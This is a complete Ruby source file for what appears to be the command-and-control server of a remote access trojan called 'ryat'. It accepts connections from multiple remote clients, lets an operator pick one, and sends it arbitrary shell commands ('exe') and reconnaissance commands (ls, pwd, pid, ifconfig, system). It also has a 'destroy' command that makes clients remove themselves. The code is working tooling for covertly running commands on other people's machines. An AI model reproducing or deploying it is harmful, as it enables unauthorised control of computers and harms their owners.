#!/usr/bin/env ruby

require 'socket'
require 'colorize'

class Server
  attr_accessor :client_count, :current_client, :clients

  def initialize(port)
    @client_count = 0
    @current_client = nil
    @clients = {}
    @server = TCPServer.new(port)
    @server.setsockopt(Socket::SOL_SOCKET, Socket::SO_REUSEADDR, true)
  end

  def run
    loop do
      begin
        connection = @server.accept
        client_id = client_count + 1
        puts "\nNew Connection => ID: #{client_id} IP: #{connection.peeraddr[3]} ".green

        client = Client.new(
          connection,
          connection.peeraddr[3],
          client_id
        )
        @clients[client_id] = client
        @client_count += 1
      rescue Exception => e
        puts e.message.red
        puts e.backtrace.join("\n").red
      end
    end
  end

  def help(server_cmds, client_cmds)
    puts "Server Commands:".green
    server_cmds.each { |gen| puts "- #{gen}" }
    puts "\nClient Commands:".green
    client_cmds.each { |cli| puts "- #{cli}" }
  end

  def select_client(id)
    begin
      self.current_client = @clients[id]
      raise NoMethodError if @current_client.nil?
      puts "Client #{id} selected".green
    rescue NoMethodError => e
      puts "Invalid id: #{id}\nEnter 'clients' to see available clients".red
    end
  end

  def unselect
    @current_client = nil
  end

  def get_clients
    conns = []
    @clients.each_value { |c| conns << c }
    conns
  end

  def send_client(msg, client)
    begin
      client.connection.write(msg)
    rescue Exception => e
      puts e.message.red
      puts e.backtrace.join("\n").red
    end
  end

  def recv_client(client)
    begin
      len = client.connection.gets
      client.connection.read(len.to_i)
    rescue Exception => e
      puts "#{e.message} CLIENT RECV HANG".red
      return
    end
  end

  def list_clients
    return 'No clients available'.red if @clients.empty?
    str = ''
    get_clients.each { |client| puts client }
    str
  end

  def destroy_client(id)
    begin
      client = @clients[id]
      raise NoMethodError if client.nil?
      if @current_client
        @current_client = nil if @current_client.uid == id
      end

      send_client('destroy', client)
      @clients.delete(id)
      puts "Client #{id} destroyed".yellow
    rescue NoMethodError => e
      puts "Invalid id: #{id}\nEnter 'clients' to see available clients".red
    end
  end

  def heartbeat
    # Check if the client is still alive and responding
    get_clients.each do |temp_client|
      send_client('hearbeat', temp_client)
      beat = recv_client(temp_client)
      if beat != 'alive'
        destroy_client(temp_client.uid)
      end
    end
    puts "Heartbeat Finished - All non-responding clients removed.".green
  end

  def hardexit
    print "Exit server and destroy all clients? [y/n]: "
    inp = $stdin.gets.chomp.downcase
    if inp == 'yes' || inp == 'y'
      get_clients.each { |client| send_client('destroy', client) }
      exit(0)
    end
  end

  def quit
    print "Exit server but keep clients active? [y/n]: "
    inp = $stdin.gets.chomp.downcase
    exit 0 if inp == 'yes' || inp == 'y'
  end
end

class Client
  attr_accessor :connection, :addr, :uid

  def initialize(connection, addr, uid)
    @connection = connection
    @addr = addr
    @uid = uid
  end

  def to_s
    result = "ID: #{@uid.to_s} IP: #{@addr.to_s}".green
  end
end

def get_input(prompt = 'ryat>')
  print "#{prompt} "
  inp = $stdin.gets.chomp
end

def start
  client_cmds = %w[
    exe ls pwd pid ifconfig system
  ]

  server_cmds = %w[
    help select unselect clients heartbeat history destroy hardexit exit
  ]

  port = ARGV[0]
  port ||= 3200

  client = nil
  data = nil
  history = []
  server = Server.new(port)

  Thread.new { server.run }
  puts "Sever started on port #{port}".green

  loop do
    if server.current_client.nil?
      input = get_input
    else
      input = get_input("ryat (Client #{server.current_client.uid})> ")
    end
    next if input.nil?
    history.push(input)
    cmd, action = input.split(' ')

    if client_cmds.include?(input) && server.current_client.nil?
      puts "Client specific command, select a client first (#{server.client_count} available)".red
      next
    end

    case cmd
    # Server Commands
    when 'help'
      server.help(server_cmds, client_cmds)
    when 'select'
      server.select_client(action.to_i)
    when 'unselect'
      server.unselect
    when 'clients'
      puts server.list_clients
    when 'heartbeat'
      server.heartbeat
    when 'hardexit'
      server.hardexit
    when 'history'
      history.each_with_index { |cmd, i| puts "#{i}: #{cmd}"}
    when 'destroy'
      server.destroy_client(action.to_i)
    when 'exit'
      server.quit
      next
    when 'hardexit'
      server.hardexit
      next
    # Client Commands
    when 'exe'
      next if action.nil?
      server.send_client(input, server.current_client)
      data = server.recv_client(server.current_client)
    when 'ls', 'pwd', 'pid', 'ifconfig', 'system'
      server.send_client(cmd, server.current_client)
      data = server.recv_client(server.current_client)
    else
      puts "Unknown command: #{input}. Enter 'help' for available commands.".red
    end
    puts data unless data.nil?
    data = nil
  end
end

start()
